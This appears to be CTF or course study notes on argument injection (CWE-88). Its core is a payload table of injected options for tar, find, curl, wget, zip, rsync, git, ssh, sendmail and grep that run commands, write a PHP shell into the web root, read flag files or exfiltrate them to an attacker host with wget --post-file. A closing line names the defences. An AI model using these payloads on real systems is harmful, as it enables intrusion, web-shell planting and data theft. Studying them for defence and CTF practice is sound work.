# Argument injection (CWE-88) & living off the land

The program is fixed, but your input becomes **its options**. Even without shell metacharacters,
an argument starting with `-` (or a filename the shell globs into an option) changes behaviour.

## Find it
Input lands in a command line as a filename/dir/URL/pattern: backups (`tar`, `zip`, `rsync`),
search (`grep`, `find`), fetchers (`curl`, `wget`, `git clone`), converters (`convert`, `ffmpeg`),
`ssh`, `sendmail`.

## Payloads by tool (more at GTFOBins: https://gtfobins.github.io)
| Tool | Injected argument | Effect |
|---|---|---|
| `tar` | `--checkpoint=1 --checkpoint-action=exec=sh\ -c\ 'id'` | run command (deck example) |
| `tar` (wildcard `tar cf x *`) | create files named `--checkpoint=1` and `--checkpoint-action=exec=sh x.sh` | same, via glob |
| `find` | `-exec cat /flag/flag ;` / `-exec sh -c 'id' \;` | run command |
| `curl` | `-o /var/www/html/s.php http://you/s.php`, `-K /flag/flag`, `file:///flag/flag` | write / read |
| `wget` | `--post-file=/flag/flag http://you/`, `-O /var/www/html/s.php` | exfil / write |
| `zip` | `-T -TT 'sh -c id'` | run command |
| `rsync` | `-e 'sh -c id'` | run command |
| `git` | `--upload-pack='sh -c id'`, `-c core.sshCommand=...` | run command |
| `ssh` | `-oProxyCommand=sh -c id` | run command |
| `sendmail` | `-OQueueDirectory=/tmp -X/var/www/html/s.php` | write file |
| `grep` | `-r . /flag` / `-f /flag/flag` | read |
| `ls` via glob `*` | file named `-la` | option smuggling (deck demo) |

## Defence vocabulary (for write-ups)
Pass `--` before user operands, use argument arrays, allowlist values.

Seen in: `inj5` (NightPack: `tar czf /tmp/backup.tgz <dir>` — here plain `;` works, but tar options
also would), deck: CVE-2020-9478 (Rubrik unquoted `$destDir`).
